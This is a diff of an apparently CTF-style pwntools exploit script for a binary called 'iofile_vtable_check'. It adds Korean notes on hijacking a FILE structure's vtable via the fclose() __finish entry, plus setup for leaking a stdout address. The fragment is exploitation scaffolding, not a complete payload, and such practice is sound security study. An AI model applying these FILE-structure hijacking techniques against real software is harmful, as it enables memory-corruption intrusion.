@@ -13,12 +13,19 @@ from pwn import *
 마지막에 fclose() 있으니까
 JUMP_FIELD(_IO_finish_t, __finish); // fclose()
 이거 쓰면 되지 않나?
+
+아닌가.. 기억이 안난다.
+
+대략적인 흐름은
+fp에 페이로드 쓰는데, fp+0xe0에는 0이 들어가 있어야한다.
+기억상 이쯤에는 딱히 필요한 값이 들어가진 않았던 것 같다.
+구조체를 다시 봐야겠다.
 '''
 
 context.binary = elf = ELF("./iofile_vtable_check")
 context.log_level = "debug"
 context.arch = "amd64"
-
+context.terminal = ["tmux", "splitw", "-h"]
 
 def slog(n, a): return success(': '.join([n, hex(a)]))
 
@@ -29,7 +36,7 @@ if args.REMOTE:
     libc = ELF('./libc.so.6')
 else:
     p = process()
-    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+    libc = ELF('./libc.so.6')
 
 p.recvuntil(b'stdout: ')
 stdout = int(p.recvline()[:-1].strip(), 16)
